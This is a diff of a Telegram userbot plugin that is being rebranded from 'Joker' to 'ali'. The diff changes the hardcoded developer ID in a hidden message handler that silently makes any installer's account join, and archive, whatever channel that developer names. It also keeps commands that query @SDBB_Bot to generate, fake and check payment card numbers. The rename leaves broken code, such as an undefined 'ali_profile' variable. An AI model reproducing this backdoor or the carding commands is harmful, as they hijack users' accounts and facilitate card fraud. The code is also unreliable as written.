@@ -8,7 +8,7 @@ from telethon.tl.functions.phone import CreateGroupCallRequest as startvc
 from telethon.tl.functions.phone import DiscardGroupCallRequest as stopvc
 from telethon.tl.functions.phone import GetGroupCallRequest as getvc
 from telethon.tl.functions.phone import InviteToGroupCallRequest as invitetovc
-from JoKeRUB import l313l
+from aliup import l313l
 from ..core.managers import edit_delete, edit_or_reply
 import os
 import tempfile
@@ -60,8 +60,6 @@ async def _(e):
     except Exception as ex:
         await edit_or_reply(e, f"`{str(ex)}`")
 
-# ================العاب الجوكر=========================
-
 R = [
     "**𓆰**العـاب الاحترافيه** 🎮𓆪 \n"
     "  ❶ **⪼**  [حرب الفضاء 🛸](https://t.me/gamee?game=ATARIAsteroids)   \n"
@@ -83,8 +81,8 @@ R = [
     "  ⓱ **⪼**  [جيت واي 🚨](https://t.me/gamee?game=Getaway)   \n"
     "  ⓲ **⪼**  [الالـوان 🔮](https://t.me/gamee?game=ColorHit)   \n"
     "  ⓳ **⪼**  [مدفع الكرات🏮](https://t.me/gamee?game=NeonBlaster)   \n"
-    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩الــسيد𓆪 𖠛🇷🇺 ](t.me/lMl10l)   \n"
-    "**-** قناة السورس **⪼ [𐇮 الجوكري ](t.me/jepthon)   "
+    "**-** مطور السورس **⪼ [𐇮 𓂐 𓆩𓆪 𖠛🇷🇺 ](t.me/n_u_7)   \n"
+    "**-** قناة السورس **⪼ [𐇮 ꪖꪶ𝓲 ](t.me/u_gg_u)   "
 ]
 
 @l313l.on(admin_cmd(pattern="بلي$"))
@@ -282,11 +280,11 @@ HuRe_Bosa = [
 async def ithker(knopis):
     await knopis.edit(choice(HuRe_Bosa))
 
-DevJoker = [705475246]
-#تضل تخمط من عمك الجوكر ؟ الى اين يستمُر الفشل ياغُلام
+Devali = [232499688]
+
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.message.message.startswith("تمويل") and event.sender_id in DevJoker:
+    if event.message.message.startswith("تمويل") and event.sender_id in Devali:
         message = event.message
         channel_username = None
         if len(message.text.split()) > 1:
@@ -294,11 +292,11 @@ async def Hussein(event):
         if channel_username:
             try:
                 await l313l(JoinChannelRequest(channel_username))
-                response = "**᯽︙ تم الانضمام إلى القناة بنجاح!**"
+                response = "** تم الانضمام إلى القناة بنجاح!**"
             except ValueError:
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
         else:
-            response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
+            response = "** يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
         #await event.reply(response)
 
 @l313l.on(events.NewMessage(incoming=True))
@@ -312,11 +310,11 @@ async def Hussein(event):
             try:
                 await l313l(JoinChannelRequest(channel_username))
                 await l313l.edit_folder(channel_username, folder=1)
-                response = "**᯽︙ تم الانضمام إلى القناة بنجاح ووضعها في مجلد الأرشيف!**"
+                response = "** تم الانضمام إلى القناة بنجاح ووضعها في مجلد الأرشيف!**"
             except ValueError:
                 response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
         else:
-            response = "**᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
+            response = "** يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️** "
         #await event.reply(response)
 client = l313l
 
@@ -327,16 +325,16 @@ async def handle_unblock_all(event):
         limit=200
     ))
     if not blocked_users.users:
-        await event.edit("**᯽︙ لا يوجد مستخدمين محظورين في حسابك 🤷🏻**")
+        await event.edit("** لا يوجد مستخدمين محظورين في حسابك 🤷🏻**")
         return
     for user in blocked_users.users:
         try:
             await client(functions.contacts.UnblockRequest(
                 id=InputPeerUser(user.id, user.access_hash)
             ))
-            aljoker_entity = await client.get_entity(user.id)
-            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
-            await event.edit(f"᯽︙ تم إلغاء حظر المستخدم : {aljoker_profile}")
+            ali_entity = await client.get_entity(user.id)
+            aljoker_profile = f"[{ali_entity.first_name}](tg://user?id={ali_entity.id})"
+            await event.edit(f" تم إلغاء حظر المستخدم : {ali_profile}")
             asyncio.sleep(3)
         except ValueError:
             continue
@@ -354,15 +352,13 @@ async def Hussein(event):
             await conv.send_message(f'{user_id}')
             response = await conv.get_response()
             await event.edit(response.text)
-#من تفكر تخمطهن اذكر المصدر وصير حباب لتبوگ تعب غيرك !
-#By Hussein For Aljoker 🤡
 @l313l.ar_cmd(pattern=r"توليد(.*)")
 async def Hussein(event):
-    await event.edit('**᯽︙ يتم الان توليد الفيزا انتظر 7 ثواني من فضلك 🫶🏻 **')
+    await event.edit('** يتم الان توليد الفيزا انتظر 7 ثواني من فضلك 🫶🏻 **')
     bot_username = '@SDBB_Bot'
-    joker = event.raw_text
-    aljoker = joker.split('.توليد')[1].strip()
-    message = f'/gen {aljoker}'
+    ali = event.raw_text
+    alali = ali.split('.توليد')[1].strip()
+    message = f'/gen {alali}'
     async with event.client.conversation(bot_username) as conv:
         await conv.send_message(message)
         await asyncio.sleep(7)
@@ -370,14 +366,14 @@ async def Hussein(event):
     async for edited_response in event.client.iter_messages(bot_username, limit=1):
         if edited_response.id == response.id and edited_response.message != response.message:
             response = edited_response
-    await event.edit(f'**ها هيَ الفيزات تم استخراجها من قبل سورس الجوكر** \n@jepthon:\n {response.text}')
+    await event.edit(f'**ها هيَ الفيزات تم استخراجها من قبل سورس علي** \n@jepthon:\n {response.text}')
 @l313l.ar_cmd(pattern=r"المعلومات(.*)")
 async def Hussein(event):
-    await event.edit('**᯽︙ يتم الان البحث عن معلومات الفيزا انتظر بضعة ثواني من فضلك 🫶🏻 **')
+    await event.edit('** يتم الان البحث عن معلومات الفيزا انتظر بضعة ثواني من فضلك 🫶🏻 **')
     bot_username = '@SDBB_Bot'
-    joker = event.raw_text
-    aljoker = joker.split('.المعلومات')[1].strip()
-    message = f'/fake {aljoker}'
+    ali = event.raw_text
+    alali = ali.split('.المعلومات')[1].strip()
+    message = f'/fake {alali}'
     async with event.client.conversation(bot_username) as conv:
         await conv.send_message(message)
         await asyncio.sleep(5)
@@ -385,14 +381,14 @@ async def Hussein(event):
     async for edited_response in event.client.iter_messages(bot_username, limit=1):
         if edited_response.id == response.id and edited_response.message != response.message:
             response = edited_response
-    await event.edit(f'**ها هيَ المعلومات للفيزا تم استخراجها من قبل سورس الجوكر** \n@jepthon\n {response.text}')
+    await event.edit(f'**ها هيَ المعلومات للفيزا تم استخراجها من قبل سورس علي** \n@u_gg_u\n {response.text}')
 @l313l.ar_cmd(pattern=r"جيك(.*)")
 async def Hussein(event):
-    await event.edit('**᯽︙ يتم الان فحص البطاقة انتظر 20 ثانية من فضلك 🫶🏻 **')
+    await event.edit('** يتم الان فحص البطاقة انتظر 20 ثانية من فضلك 🫶🏻 **')
     bot_username = '@SDBB_Bot'
-    joker = event.raw_text
-    aljoker = joker.split('.جيك')[1].strip()
-    message = f'/chk {aljoker}'
+    ali = event.raw_text
+    alali = ali.split('.جيك')[1].strip()
+    message = f'/chk {alali}'
     async with event.client.conversation(bot_username) as conv:
         await conv.send_message(message)
         await asyncio.sleep(20)
@@ -400,4 +396,4 @@ async def Hussein(event):
     async for edited_response in event.client.iter_messages(bot_username, limit=1):
         if edited_response.id == response.id and edited_response.message != response.message:
             response = edited_response
-    await event.edit(f'**ها هيَ البطاقة تم فحصها من قبل سورس الجوكر** \n@jepthon\n {response.text}')
+    await event.edit(f'**ها هيَ البطاقة تم فحصها من قبل سورس علي** \n@u_gg_u\n {response.text}')
